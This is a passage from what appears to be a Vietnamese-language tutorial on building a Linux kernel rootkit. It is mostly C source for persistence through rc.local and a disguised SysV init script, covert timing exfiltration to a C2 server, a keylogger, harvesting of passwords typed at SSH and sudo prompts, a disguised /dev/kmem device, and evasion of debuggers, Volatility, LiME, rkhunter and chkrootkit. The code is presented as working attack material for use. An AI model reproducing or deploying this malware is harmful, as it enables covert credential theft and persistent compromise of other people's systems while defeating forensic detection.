        module_name,
        source_dir, source_dir, source_dir, module_name,
        module_name,
        module_name,
        module_name,
        module_name,
        module_name,
        module_name,
        module_name);

    char *argv[] = { "/bin/sh", "-c", cmd, NULL };
    char *envp[] = { "PATH=/usr/sbin:/usr/bin:/sbin:/bin", NULL };
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}
```

---

## Boot Script Modification — rc.local, SysV init {#boot-script-persistence}

```c
/* boot_script.c — Legacy boot script persistence
 *
 * Cho hệ thống KHÔNG dùng systemd (hoặc dùng kết hợp).
 */

#include "rootkit.h"
#include <linux/kmod.h>

/* ── Method 1: /etc/rc.local ──
 * Legacy phương pháp, vẫn hoạt động trên nhiều distros.
 * rc.local chạy scripts cuối cùng trong boot sequence.
 */
static void persist_rc_local(const char *module_name)
{
    char cmd[512];

    snprintf(cmd, sizeof(cmd),
        /* Tạo rc.local nếu chưa có (một số distro mới không có sẵn) */
        "touch /etc/rc.local; "
        "chmod +x /etc/rc.local; "
        /* Thêm shebang nếu chưa có */
        "head -1 /etc/rc.local | grep -q '^#!/' || "
        "sed -i '1i #!/bin/bash' /etc/rc.local; "
        /* Thêm modprobe command TRƯỚC 'exit 0' (nếu có) */
        "grep -q 'modprobe %s' /etc/rc.local || "
        "sed -i '/^exit 0/i /sbin/modprobe %s' /etc/rc.local; "
        /* Nếu không có 'exit 0': append */
        "grep -q 'modprobe %s' /etc/rc.local || "
        "echo '/sbin/modprobe %s' >> /etc/rc.local",
        module_name, module_name, module_name, module_name);

    char *argv[] = { "/bin/sh", "-c", cmd, NULL };
    char *envp[] = { "PATH=/usr/sbin:/usr/bin:/sbin:/bin", NULL };
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}

/* ── Method 2: SysV init script ── */
static void persist_sysv_init(const char *module_name)
{
    char cmd[2048];

    snprintf(cmd, sizeof(cmd),
        "cat > /etc/init.d/%s << 'INITEOF'\n"
        "#!/bin/sh\n"
        "### BEGIN INIT INFO\n"
        "# Provides:          %s\n"
        "# Required-Start:    $local_fs\n"
        "# Required-Stop:\n"
        "# Default-Start:     2 3 4 5\n"
        "# Default-Stop:      0 1 6\n"
        "# Description:       Hardware firmware helper\n"
        "### END INIT INFO\n"
        "case \"$1\" in\n"
        "  start) /sbin/modprobe %s 2>/dev/null ;;\n"
        "  stop)  /sbin/rmmod %s 2>/dev/null ;;\n"
        "  *) echo \"Usage: $0 {start|stop}\" ;;\n"
        "esac\n"
        "INITEOF\n"
        "chmod +x /etc/init.d/%s; "
        "update-rc.d %s defaults 2>/dev/null; "
        "chkconfig --add %s 2>/dev/null",
        module_name, module_name, module_name,
        module_name, module_name, module_name, module_name);

    char *argv[] = { "/bin/sh", "-c", cmd, NULL };
    char *envp[] = { "PATH=/usr/sbin:/usr/bin:/sbin:/bin", NULL };
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}
```

---

## Covert Timing Channel — Encode data trong timing {#timing-channel}

```c
/* timing_channel.c — Covert timing channel
 *
 * Encode data KHÔNG trong packet content mà trong THỜI GIAN
 * giữa các packets.
 *
 * Concept:
 *   Bit 1: delay 100ms rồi send packet
 *   Bit 0: delay 50ms rồi send packet
 *   Receiver measure inter-packet timing → decode bits.
 *
 * Ưu điểm:
 *   - Packet content hoàn toàn bình thường (ICMP ping, HTTP, DNS)
 *   - Deep packet inspection KHÔNG phát hiện (content clean)
 *   - Chỉ timing analysis mới detect được
 *   - Bandwidth thấp nhưng stealth cực cao
 *
 * Nhược điểm:
 *   - Bandwidth rất thấp (~10 bits/second)
 *   - Network jitter gây noise → cần error correction
 *   - Cần synchronized clock hoặc preamble
 */

#include "rootkit.h"
#include <linux/delay.h>
#include <net/sock.h>

#define TIMING_BIT_1_MS  100   /* Delay cho bit 1 */
#define TIMING_BIT_0_MS   50   /* Delay cho bit 0 */
#define TIMING_SYNC_MS   200   /* Sync pulse (start of byte) */

/* ── Send single bit qua timing ── */
static int timing_send_bit(struct socket *sock,
                            struct sockaddr_in *dest,
                            int bit)
{
    /* Delay = encode bit value */
    msleep(bit ? TIMING_BIT_1_MS : TIMING_BIT_0_MS);

    /* Send innocuous packet (ICMP ping hoặc DNS query) */
    char payload[] = "AAAA";
    struct msghdr msg = { 0 };
    struct kvec iov = { .iov_base = payload, .iov_len = 4 };
    msg.msg_name = dest;
    msg.msg_namelen = sizeof(*dest);

    return kernel_sendmsg(sock, &msg, &iov, 1, 4);
}

/* ── Send byte (8 bits) qua timing channel ── */
static int timing_send_byte(struct socket *sock,
                              struct sockaddr_in *dest,
                              unsigned char byte)
{
    int i;

    /* Sync pulse: longer delay signals start of byte.
     * Receiver calibrate timing từ sync pulse. */
    msleep(TIMING_SYNC_MS);

    /* MSB first */
    for (i = 7; i >= 0; i--) {
        int bit = (byte >> i) & 1;
        timing_send_bit(sock, dest, bit);
    }

    return 0;
}

/* ── Exfiltrate data qua timing channel ── */
static int rk_timing_exfil(__be32 c2_ip, __be16 c2_port,
                             const void *data, int data_len)
{
    struct socket *sock;
    struct sockaddr_in dest;
    const unsigned char *bytes = data;
    int i, ret;

    ret = sock_create_kern(&init_net, AF_INET, SOCK_DGRAM,
                            IPPROTO_UDP, &sock);
    if (ret < 0) return ret;

    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = c2_ip;
    dest.sin_port = c2_port;

    /* Send length header (4 bytes) */
    for (i = 0; i < 4; i++)
        timing_send_byte(sock, &dest, (data_len >> (24 - i * 8)) & 0xFF);

    /* Send data bytes */
    for (i = 0; i < data_len; i++) {
        timing_send_byte(sock, &dest, bytes[i]);

        /* Yield CPU periodically — prevent soft lockup warning.
         * schedule() cho phép kernel chạy other tasks. */
        if (i % 10 == 0)
            schedule();
    }

    sock_release(sock);
    return 0;
}
```

---

## Code Integrity Self-Check {#code-integrity}

```c
/* code_integrity.c — Rootkit tự kiểm tra code integrity
 *
 * Detect nếu analyst hoặc tool đã patch/modify rootkit code:
 *   - Breakpoint (0xCC INT3) inject bởi debugger
 *   - Byte modification bởi LKRG hoặc manual patching
 *   - Function redirection (hook on our hooks)
 *
 * Method: hash rootkit code pages, periodically verify.
 */

#include "rootkit.h"
#include <crypto/hash.h>       /* shash API */

#define HASH_ALGO  "sha256"
#define HASH_SIZE  32   /* SHA-256 = 32 bytes */

static u8 code_hash_saved[HASH_SIZE];
static bool hash_initialized = false;

/* ── Compute SHA-256 hash of module code section ── */
static int compute_module_hash(u8 *hash_out)
{
    struct crypto_shash *tfm;
    struct shash_desc *desc;
    int desc_size, ret;
    void *code_start;
    unsigned int code_size;

    /* Module code location:
     *   THIS_MODULE->core_layout.base = start of module memory
     *   THIS_MODULE->core_layout.text_size = size of code (.text) section
     *
     * Chỉ hash code section (không hash data — data thay đổi bình thường). */
    code_start = THIS_MODULE->core_layout.base;
    code_size  = THIS_MODULE->core_layout.text_size;

    /* Allocate SHA-256 transform */
    tfm = crypto_alloc_shash(HASH_ALGO, 0, 0);
    if (IS_ERR(tfm)) return PTR_ERR(tfm);

    desc_size = sizeof(*desc) + crypto_shash_descsize(tfm);
    desc = kzalloc(desc_size, GFP_KERNEL);
    if (!desc) {
        crypto_free_shash(tfm);
        return -ENOMEM;
    }
    desc->tfm = tfm;

    /* Compute hash */
    ret = crypto_shash_init(desc);
    if (ret) goto out;

    ret = crypto_shash_update(desc, code_start, code_size);
    if (ret) goto out;

    ret = crypto_shash_final(desc, hash_out);

out:
    kfree(desc);
    crypto_free_shash(tfm);
    return ret;
}

/* ── Initialize: save hash ngay sau module load ── */
int rk_integrity_init(void)
{
    int ret = compute_module_hash(code_hash_saved);
    if (ret == 0)
        hash_initialized = true;
    return ret;
}

/* ── Verify: so sánh hash hiện tại với saved ──
 *
 * Gọi periodically từ watchdog thread.
 * Nếu mismatch → code đã bị tamper.
 */
bool rk_integrity_check(void)
{
    u8 current_hash[HASH_SIZE];
    int ret;

    if (!hash_initialized)
        return true;

    ret = compute_module_hash(current_hash);
    if (ret)
        return true;  /* Hash fail → assume OK (crash prevention) */

    if (memcmp(current_hash, code_hash_saved, HASH_SIZE) != 0) {
        pr_err("rk: CODE INTEGRITY VIOLATION DETECTED\n");

        /* Response options:
         * 1. Re-patch: restore original code từ backup
         * 2. Self-destruct: remove traces and unload
         * 3. Alert: notify C2 server
         * 4. Evade: change behavior (go silent)
         */
        return false;
    }

    return true;  /* Integrity OK */
}

/* ── Scan for breakpoints (0xCC INT3) trong code section ── */
bool rk_detect_breakpoints(void)
{
    unsigned char *code = THIS_MODULE->core_layout.base;
    unsigned int size = THIS_MODULE->core_layout.text_size;
    unsigned int i;
    int bp_count = 0;

    for (i = 0; i < size; i++) {
        if (code[i] == 0xCC) {
            bp_count++;
            /* 0xCC có thể là legitimate instruction (aligned nop)
             * nhưng nhiều 0xCC = debugger breakpoints. */
        }
    }

    /* Threshold: >3 breakpoints = likely debugger */
    if (bp_count > 3) {
        pr_err("rk: %d breakpoints detected in code!\n", bp_count);
        return true;
    }

    return false;
}
```

---

## Memory Forensics Evasion — Chống Volatility/LiME {#memory-forensics-evasion}

```c
/* memory_evasion.c — Evade memory forensics tools
 *
 * Memory forensics tools (Volatility, Rekall) dump RAM và analyze:
 *   - Module list traversal (find hidden modules)
 *   - Syscall table verification (detect hooks)
 *   - Process list cross-referencing
 *   - String/signature scanning in memory
 *
 * Evasion techniques:
 *   1. Clear sensitive strings từ module memory
 *   2. Relocate code ngoài module address range
 *   3. Manipulate module metadata structures
 *   4. Clear freed slab caches (destroy forensic artifacts)
 *   5. Detect LiME (memory dump tool) loading
 */

#include "rootkit.h"
#include <linux/vmalloc.h>
#include <linux/slab.h>

/* ══════════════════════════════════════════════════════════════
 * Technique 1: Scrub strings từ module memory
 *
 * Volatility signature scan tìm strings: "rootkit", "hidden",
 * "sys_call_table", magic values, etc.
 *
 * Sau khi init xong: zero out strings không còn cần.
 * Giữ lại function pointers (code vẫn cần).
 * ══════════════════════════════════════════════════════════════ */
static void rk_scrub_module_strings(void)
{
    /* Module .rodata section chứa string literals.
     *
     * THIS_MODULE->core_layout.base = module start
     * THIS_MODULE->core_layout.ro_size = read-only section size
     *   (includes .text + .rodata)
     * THIS_MODULE->core_layout.text_size = .text only
     *
     * .rodata nằm từ text_size → ro_size.
     */
    unsigned long rodata_start =
        (unsigned long)THIS_MODULE->core_layout.base +
        THIS_MODULE->core_layout.text_size;
    unsigned long rodata_size =
        THIS_MODULE->core_layout.ro_size -
        THIS_MODULE->core_layout.text_size;

    /* Make rodata writable temporarily */
    set_memory_rw(rodata_start & PAGE_MASK,
                   (rodata_size >> PAGE_SHIFT) + 1);

    /* Zero specific patterns — NOT toàn bộ (sẽ crash vì
     * một số strings vẫn được reference). */
    char *scan = (char *)rodata_start;
    unsigned long i;
    for (i = 0; i < rodata_size - 8; i++) {
        /* Zero out sensitive strings */
        if (memcmp(scan + i, "rootkit", 7) == 0 ||
            memcmp(scan + i, "rk_hook", 7) == 0 ||
            memcmp(scan + i, "backdoor", 8) == 0)
            memset(scan + i, 0, 8);
    }

    /* Restore read-only */
    set_memory_ro(rodata_start & PAGE_MASK,
                   (rodata_size >> PAGE_SHIFT) + 1);
}

/* ══════════════════════════════════════════════════════════════
 * Technique 2: Relocate hook handlers ngoài module range
 *
 * Volatility kiểm tra: "does syscall table entry point INTO
 * a known module address range?"
 * Nếu entry trỏ vào module range → flagged.
 * Nếu entry trỏ vào vmalloc range mà KHÔNG thuộc module → stealth.
 *
 * Copy hook function code vào vmalloc'd executable memory.
 * Syscall table entry trỏ tới vmalloc region.
 * Volatility thấy entry trỏ ra ngoài module list → confused.
 * ══════════════════════════════════════════════════════════════ */
static void *rk_relocate_handler(void *original_handler,
                                   unsigned int handler_size)
{
    void *relocated;

    /* Allocate executable memory NGOÀI module range.
     *
     * __vmalloc: allocate với specific flags.
     * PAGE_KERNEL_EXEC: readable + writable + executable.
     *
     * Memory nằm trong vmalloc range (0xffffc90000000000...)
     * nhưng KHÔNG thuộc bất kỳ module nào.
     */
    relocated = __vmalloc(handler_size, GFP_KERNEL);
    if (!relocated) return NULL;

    /* Copy handler code */
    memcpy(relocated, original_handler, handler_size);

    /* Make executable */
    set_memory_x((unsigned long)relocated & PAGE_MASK,
                  (handler_size >> PAGE_SHIFT) + 1);

    return relocated;
}

/* ══════════════════════════════════════════════════════════════
 * Technique 3: Detect LiME module loading
 *
 * LiME (Linux Memory Extractor) = kernel module dump RAM.
 * Nếu LiME load → analyst đang acquire memory dump.
 *
 * Detection: monitor module loading events.
 * Response: cleanup sensitive data TRƯỚC dump hoàn thành.
 * ══════════════════════════════════════════════════════════════ */
static int rk_module_notify(struct notifier_block *nb,
                              unsigned long action, void *data)
{
    struct module *mod = data;

    if (action == MODULE_STATE_COMING) {
        /* Module đang load. Check tên. */
        if (strstr(mod->name, "lime") ||
            strstr(mod->name, "avml") ||
            strstr(mod->name, "pmem") ||
            strstr(mod->name, "fmem")) {
            pr_info("rk: memory acquisition tool detected: %s\n",
                    mod->name);

            /* EMERGENCY: scrub sensitive data */
            rk_scrub_module_strings();
        }
    }

    return NOTIFY_DONE;
}

static struct notifier_block rk_mod_nb = {
    .notifier_call = rk_module_notify,
    .priority = INT_MAX,  /* Run FIRST */
};

/* Register: register_module_notifier(&rk_mod_nb);
 * Unregister: unregister_module_notifier(&rk_mod_nb); */
```

---

## Keylogger — Keyboard input interception {#keylogger}

```c
/* keylogger.c — Kernel-level keyboard input interception
 *
 * 2 methods:
 *   A) Input subsystem handler (input_register_handler)
 *   B) TTY layer hook (tty_operations read/write)
 *
 * Method A ưu tiên vì:
 *   - Capture ALL keyboard input (including passwords, SSH)
 *   - Có keycodes trước mọi userspace processing
 *   - Kernel API chính thức, stable across versions
 *   - Hoạt động cho cả virtual terminals và X11/Wayland
 */

#include "rootkit.h"
#include <linux/input.h>     /* input_dev, input_handler, input_event */
#include <linux/keyboard.h>  /* keyboard notifier */

/* ══════════════════════════════════════════════════════════════
 * Method A: Input subsystem handler
 *
 * Linux input subsystem:
 *   Hardware (keyboard) → input_dev → input_handler → userspace
 *
 * input_register_handler: đăng ký handler nhận ALL input events.
 * Event types:
 *   EV_KEY = key press/release
 *   EV_REL = relative movement (mouse)
 *   EV_ABS = absolute position (touchscreen)
 *
 * Key event struct:
 *   struct input_event {
 *       struct timeval time;
 *       __u16 type;     // EV_KEY
 *       __u16 code;     // KEY_A, KEY_B, ... (scancode)
 *       __s32 value;    // 0=release, 1=press, 2=repeat
 *   };
 * ══════════════════════════════════════════════════════════════ */

#define LOG_BUF_SIZE 4096
static char key_buffer[LOG_BUF_SIZE];
static int key_buf_pos = 0;
static DEFINE_SPINLOCK(key_lock);

/* Scancode → ASCII mapping (US layout, simplified) */
static const char *keymap[] = {
    "", "<ESC>", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0",
    "-", "=", "<BACKSPACE>", "<TAB>",
    "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]",
    "<ENTER>", "<CTRL>",
    "a", "s", "d", "f", "g", "h", "j", "k", "l", ";", "'", "`",
    "<SHIFT>", "\\",
    "z", "x", "c", "v", "b", "n", "m", ",", ".", "/", "<SHIFT>",
    "*", "<ALT>", " "
};
#define KEYMAP_SIZE (sizeof(keymap) / sizeof(keymap[0]))

/* ── Keyboard notifier callback ──
 *
 * register_keyboard_notifier: API nhận mọi keyboard events.
 * Simpler than input_handler — chỉ cho keyboard, không cần
 * match input devices.
 */
static int rk_keyboard_notify(struct notifier_block *nb,
                                unsigned long action, void *data)
{
    struct keyboard_notifier_param *param = data;

    /* Chỉ xử lý keypress (không phải release/repeat) */
    if (action != KBD_KEYSYM || !param->down)
        return NOTIFY_DONE;

    /* param->value = keycode.
     * Convert tới printable character. */
    unsigned int keycode = param->value;

    spin_lock(&key_lock);

    if (keycode < KEYMAP_SIZE && keymap[keycode][0] != '<') {
        /* Printable character */
        if (key_buf_pos < LOG_BUF_SIZE - 1) {
            key_buffer[key_buf_pos++] = keymap[keycode][0];
        }
    } else if (keycode < KEYMAP_SIZE) {
        /* Special key — log token */
        int tlen = strlen(keymap[keycode]);
        if (key_buf_pos + tlen < LOG_BUF_SIZE) {
            memcpy(key_buffer + key_buf_pos, keymap[keycode], tlen);
            key_buf_pos += tlen;
        }
    }

    spin_unlock(&key_lock);

    /* Flush buffer khi full hoặc ENTER pressed */
    if (key_buf_pos > LOG_BUF_SIZE - 64 || keycode == KEY_ENTER) {
        rk_flush_keylog();
    }

    return NOTIFY_DONE;
}

static struct notifier_block rk_kb_nb = {
    .notifier_call = rk_keyboard_notify,
};

/* ── Flush: exfiltrate keystroke buffer ── */
static void rk_flush_keylog(void)
{
    char *snapshot;
    int len;

    spin_lock(&key_lock);
    if (key_buf_pos == 0) {
        spin_unlock(&key_lock);
        return;
    }

    snapshot = kzalloc(key_buf_pos + 1, GFP_ATOMIC);
    if (snapshot) {
        memcpy(snapshot, key_buffer, key_buf_pos);
        len = key_buf_pos;
    }
    key_buf_pos = 0;
    spin_unlock(&key_lock);

    if (snapshot) {
        snapshot[len] = '\0';
        /* Send via covert channel (ICMP tunnel, DNS tunnel, etc.)
         * Hoặc: write tới hidden file. */
        /* rk_send_icmp_data(c2_ip, snapshot, len); */

        /* Debug: write tới hidden file */
        struct file *f = filp_open("/tmp/.rk_keys", O_WRONLY|O_CREAT|O_APPEND, 0600);
        if (!IS_ERR(f)) {
            loff_t pos = 0;
            kernel_write(f, snapshot, len, &pos);
            kernel_write(f, "\n", 1, &pos);
            filp_close(f, NULL);
        }
        kfree(snapshot);
    }
}

/* Install: register_keyboard_notifier(&rk_kb_nb);
 * Remove:  unregister_keyboard_notifier(&rk_kb_nb); */
```

---

## Credential Harvesting — Thu thập mật khẩu {#credential-harvesting}

```c
/* cred_harvest.c — Intercept authentication credentials
 *
 * Target functions:
 *   1. pam_authenticate → PAM-based auth (SSH, sudo, login, su)
 *   2. unix_verify_password → /etc/shadow password check
 *   3. crypto hash compare → generic credential check
 *
 * Approach: Kprobe on authentication functions, extract
 * username + password TRƯỚC hash/verify.
 *
 * APT relevance: mọi APT kit thu thập credentials.
 * Credentials = lateral movement capability.
 */

#include "rootkit.h"
#include <linux/kprobes.h>

#define CRED_LOG_PATH "/tmp/.rk_creds"

/* ── Log captured credential ── */
static void rk_log_credential(const char *source,
                                const char *username,
                                const char *password)
{
    struct file *f;
    char buf[512];
    loff_t pos = 0;
    int len;

    len = snprintf(buf, sizeof(buf), "[%s] user=%s pass=%s\n",
                   source, username, password ? password : "(null)");

    f = filp_open(CRED_LOG_PATH, O_WRONLY | O_CREAT | O_APPEND, 0600);
    if (!IS_ERR(f)) {
        kernel_write(f, buf, len, &pos);
        filp_close(f, NULL);
    }
}

/* ══════════════════════════════════════════════════════════════
 * Method 1: Hook sys_openat cho /etc/shadow reads
 *
 * Khi PAM authenticate: nó read /etc/shadow.
 * Detect: monitor openat() cho /etc/shadow → log calling process.
 * Không capture password trực tiếp nhưng identify auth attempts.
 * ══════════════════════════════════════════════════════════════ */

/* ══════════════════════════════════════════════════════════════
 * Method 2: TTY sniffing — Capture password từ SSH/sudo
 *
 * Khi user type password (SSH login, sudo prompt):
 *   1. Terminal echo disabled (ICANON off, ECHO off)
 *   2. User type password → chars go through tty_operations
 *   3. tty->ops->write() ghi chars vào tty buffer
 *   4. Process read() từ tty fd
 *
 * Hook tty receive buffer: capture chars TRƯỚC process đọc.
 * Detect password input: TTY echo off → likely password prompt.
 * ══════════════════════════════════════════════════════════════ */

static int (*orig_tty_read)(struct tty_struct *, struct file *,
                             unsigned char *, size_t);

static int rk_tty_read_hook(struct tty_struct *tty, struct file *file,
                              unsigned char *buf, size_t count)
{
    int ret = orig_tty_read(tty, file, buf, count);

    if (ret > 0 && tty) {
        /* Check nếu echo disabled → password input */
        struct ktermios *termios = &tty->termios;

        if (!(termios->c_lflag & ECHO)) {
            /* Echo off = likely password entry.
             * Capture input. */
            char captured[256];
            int cap_len = (ret < 255) ? ret : 255;
            memcpy(captured, buf, cap_len);
            captured[cap_len] = '\0';

            /* Log: process name + captured input */
            char log_buf[512];
            snprintf(log_buf, sizeof(log_buf),
                     "[tty:%s] proc=%s input=%s",
                     tty->name, current->comm, captured);

            rk_log_credential("tty_sniff", current->comm, captured);
        }
    }

    return ret;
}

/* ══════════════════════════════════════════════════════════════
 * Method 3: Kprobe trên specific auth functions
 *
 * Hook internal functions gọi khi authenticate:
 *   - vfs_read on /etc/shadow
 *   - Hook process execution of sshd, sudo, su
 *
 * Khi sshd process đang chạy + read from tty → capture.
 * ══════════════════════════════════════════════════════════════ */

static int ssh_auth_handler(struct kprobe *p, struct pt_regs *regs)
{
    /* Check nếu current process là sshd hoặc sudo */
    if (strcmp(current->comm, "sshd") == 0 ||
        strcmp(current->comm, "sudo") == 0 ||
        strcmp(current->comm, "su") == 0 ||
        strcmp(current->comm, "login") == 0) {
        /* Log authentication attempt */
        rk_log_credential("auth_probe", current->comm, NULL);
    }
    return 0;
}

static struct kprobe auth_kp = {
    .symbol_name = "vfs_read",
    .pre_handler = ssh_auth_handler,
};
/* Register: register_kprobe(&auth_kp); */
```

---

## /dev/kmem & /dev/mem — Classic memory access {#devkmem}

```c
/* devkmem.c — Access kernel memory qua character devices
 *
 * /dev/mem:  access physical memory (RAM) trực tiếp
 * /dev/kmem: access kernel virtual memory trực tiếp
 *
 * Classic technique (pre-module era rootkits dùng):
 *   Open /dev/kmem → seek tới kernel address → read/write
 *   → Modify syscall table, credentials, etc.
 *
 * Modern kernels:
 *   - /dev/kmem: disabled (CONFIG_DEVKMEM=n) trên hầu hết distros
 *   - /dev/mem: restricted (CONFIG_STRICT_DEVMEM=y)
 *     chỉ cho access <1MB (BIOS area) và PCI MMIO regions
 *   - Kernel lockdown: block /dev/mem completely
 *
 * Rootkit có thể:
 *   1. Re-enable /dev/kmem (create device node, bypass restriction)
 *   2. Disable CONFIG_STRICT_DEVMEM check tại runtime
 *   3. Dùng /dev/mem + bypass STRICT_DEVMEM
 *
 * Used by: classic rootkits (SucKIT), modern rootkits for
 *          reading kernel memory without standard APIs.
 */

#include "rootkit.h"
#include <linux/mm.h>
#include <linux/io.h>

/* ══════════════════════════════════════════════════════════════
 * Method 1: Read/Write kernel memory qua /dev/mem
 *
 * Physical memory access — bypass nhiều protections.
 * Cần convert virtual address → physical address trước.
 * ══════════════════════════════════════════════════════════════ */

/* ── Virtual → Physical address conversion ── */
static phys_addr_t rk_virt_to_phys(unsigned long vaddr)
{
    pgd_t *pgd;
    p4d_t *p4d;
    pud_t *pud;
    pmd_t *pmd;
    pte_t *pte;

    /* Walk page tables: PGD → P4D → PUD → PMD → PTE → physical */
    pgd = pgd_offset(current->mm ? current->mm : &init_mm, vaddr);
    if (pgd_none(*pgd)) return 0;

    p4d = p4d_offset(pgd, vaddr);
    if (p4d_none(*p4d)) return 0;

    pud = pud_offset(p4d, vaddr);
    if (pud_none(*pud)) return 0;

    /* Check huge page (1GB) */
    if (pud_large(*pud))
        return (pud_pfn(*pud) << PAGE_SHIFT) | (vaddr & ~PUD_MASK);

    pmd = pmd_offset(pud, vaddr);
    if (pmd_none(*pmd)) return 0;

    /* Check huge page (2MB) */
    if (pmd_large(*pmd))
        return (pmd_pfn(*pmd) << PAGE_SHIFT) | (vaddr & ~PMD_MASK);

    pte = pte_offset_kernel(pmd, vaddr);
    if (!pte || pte_none(*pte)) return 0;

    return (pte_pfn(*pte) << PAGE_SHIFT) | (vaddr & ~PAGE_MASK);
}

/* ── Read kernel memory qua physical mapping ──
 *
 * ioremap: map physical address vào kernel virtual address space.
 * Thường dùng cho MMIO (hardware registers).
 * Nhưng có thể map bất kỳ physical address nào — including RAM.
 */
static int rk_read_phys(phys_addr_t phys_addr, void *buf, size_t len)
{
    void __iomem *mapped;

    mapped = ioremap(phys_addr, len);
    if (!mapped) return -ENOMEM;

    memcpy_fromio(buf, mapped, len);
    iounmap(mapped);
    return 0;
}

static int rk_write_phys(phys_addr_t phys_addr, const void *buf, size_t len)
{
    void __iomem *mapped;

    mapped = ioremap(phys_addr, len);
    if (!mapped) return -ENOMEM;

    memcpy_toio(mapped, buf, len);
    iounmap(mapped);
    return 0;
}

/* ══════════════════════════════════════════════════════════════
 * Method 2: Bypass STRICT_DEVMEM
 *
 * CONFIG_STRICT_DEVMEM: devmem_is_allowed() check.
 * Nếu return 0 → access denied.
 * Nếu return 1 → access allowed.
 *
 * Rootkit có thể:
 *   a) Hook devmem_is_allowed() → always return 1
 *   b) Modify variable directly
 * ══════════════════════════════════════════════════════════════ */
static int (*orig_devmem_is_allowed)(unsigned long pfn);

static int rk_devmem_is_allowed(unsigned long pfn)
{
    return 1;  /* Always allow — bypass STRICT_DEVMEM */
}

/* Install via ftrace hook trên devmem_is_allowed */

/* ══════════════════════════════════════════════════════════════
 * Method 3: Re-create /dev/kmem
 *
 * Nếu /dev/kmem không tồn tại (CONFIG_DEVKMEM=n),
 * rootkit có thể tạo character device thay thế
 * với custom file_operations cho phép read/write kernel memory.
 * ══════════════════════════════════════════════════════════════ */

static ssize_t rk_kmem_read(struct file *file, char __user *buf,
                              size_t count, loff_t *ppos)
{
    unsigned long kaddr = (unsigned long)*ppos;
    char *kern_buf;

    /* Validate address range */
    if (kaddr < PAGE_OFFSET)
        return -EFAULT;

    kern_buf = kzalloc(count, GFP_KERNEL);
    if (!kern_buf) return -ENOMEM;

    /* Direct copy từ kernel address */
    if (copy_from_kernel_nofault(kern_buf, (void *)kaddr, count)) {
        kfree(kern_buf);
        return -EFAULT;
    }

    if (copy_to_user(buf, kern_buf, count)) {
        kfree(kern_buf);
        return -EFAULT;
    }

    kfree(kern_buf);
    *ppos += count;
    return count;
}

static ssize_t rk_kmem_write(struct file *file, const char __user *buf,
                               size_t count, loff_t *ppos)
{
    unsigned long kaddr = (unsigned long)*ppos;
    char *kern_buf;

    if (kaddr < PAGE_OFFSET)
        return -EFAULT;

    kern_buf = kzalloc(count, GFP_KERNEL);
    if (!kern_buf) return -ENOMEM;

    if (copy_from_user(kern_buf, buf, count)) {
        kfree(kern_buf);
        return -EFAULT;
    }

    /* Bypass write protection */
    rk_unprotect_memory();
    memcpy((void *)kaddr, kern_buf, count);
    rk_protect_memory();

    kfree(kern_buf);
    *ppos += count;
    return count;
}

static const struct file_operations rk_kmem_fops = {
    .owner = THIS_MODULE,
    .read  = rk_kmem_read,
    .write = rk_kmem_write,
    .llseek = default_llseek,
};

/* Đăng ký misc device tên disguised (không đặt tên "kmem"):
 *
 * static struct miscdevice rk_kmem_dev = {
 *     .minor = MISC_DYNAMIC_MINOR,
 *     .name  = "hwrng_feed",  // disguised name
 *     .fops  = &rk_kmem_fops,
 *     .mode  = 0600,          // root-only access
 * };
 * misc_register(&rk_kmem_dev);
 */
```

---

## Syscall Table Integrity Evasion {#syscall-evasion}

```c
/* evasion.c — Evade syscall table integrity checks
 *
 * Detection tools (rkhunter, LKRG, custom scripts) verify:
 *   "Do syscall table entries point vào kernel text section?"
 *   Nếu entry trỏ ngoài [_stext, _etext] → hooked.
 *
 * Evasion techniques:
 *   1. Shadow syscall table (maintain clean copy cho checks)
 *   2. Restore-on-check (detect checker running, temp restore)
 *   3. Hook detection function itself
 * ══════════════════════════════════════════════════════════════ */

#include "rootkit.h"

/* ══════════════════════════════════════════════════════════════
 * Method 1: Detect-and-restore
 *
 * Khi detection tool chạy (rkhunter, chkrootkit):
 *   1. Detect execution qua execve hook
 *   2. Temporarily restore original syscall entries
 *   3. Tool scan → thấy clean table → report "OK"
 *   4. Re-install hooks sau khi tool exit
 *
 * Detection tools thường chỉ scan 1 lần rồi exit.
 * Window chỉ cần vài giây.
 * ══════════════════════════════════════════════════════════════ */

static bool evasion_active = false;

/* Gọi từ execve hook (Chapter 5) khi phát hiện detection tool */
static void rk_evade_checker(const char *tool_name)
{
    if (evasion_active) return;
    evasion_active = true;

    pr_info("rk: detection tool '%s' — activating evasion\n", tool_name);

    /* Temporarily remove hooks */
    rk_remove_hooks();

    /* Schedule re-installation sau delay.
     * Dùng delayed workqueue:
     *   schedule_delayed_work(&rehook_work, 5 * HZ);
     *   → 5 giây sau, hooks reinstalled.
     */
}

static void rehook_fn(struct work_struct *work)
{
    rk_install_hooks();
    evasion_active = false;
    pr_info("rk: hooks re-installed after evasion\n");
}

static DECLARE_DELAYED_WORK(rehook_work, rehook_fn);

/* Integrate vào execve handler:
 *
 * if (strstr(filename, "rkhunter") || strstr(filename, "chkrootkit"))
 *     rk_evade_checker(filename);
 *     schedule_delayed_work(&rehook_work, 5 * HZ);
 */

/* ══════════════════════════════════════════════════════════════
 * Method 2: Shadow read of /proc/kallsyms
 *
 * Detection scripts compare syscall table entries vs kallsyms.
 * Hook read() on /proc/kallsyms → return ORIGINAL addresses
 * cho hooked syscalls.
 *
 * Script thấy: sys_getdents64 = 0xffffffff81234000
 * Syscall table[getdents64] = 0xffffffff81234000 (original)
 * → "Match! Table clean."
 *
 * Thực tế: syscall table[getdents64] = 0xffffffffc0a00000 (hook)
 * Nhưng read hook return fake address cho /proc/kallsyms.
 * ══════════════════════════════════════════════════════════════ */

/* Giống filter_passwd_read nhưng cho /proc/kallsyms:
 * Replace hook address strings với original address strings.
 * Tích hợp vào hooked_read() Chapter 3. */
```

---

## Summary — 15 kỹ thuật bổ sung

| # | Kỹ thuật | Category |
|---|---|---|
| 1 | IDT Hooking | Hooking |
| 2 | MSR Hooking (SYSCALL redirect) | Hooking |
| 3 | LSM Hook Abuse (5 hook types) | Hooking |
| 4 | User Hiding (utmp/wtmp/lastlog/passwd) | Hiding |
| 5 | SELinux/AppArmor Bypass (3 methods) | Privilege Escalation |
| 6 | Namespace Escape (container breakout) | Privilege Escalation |
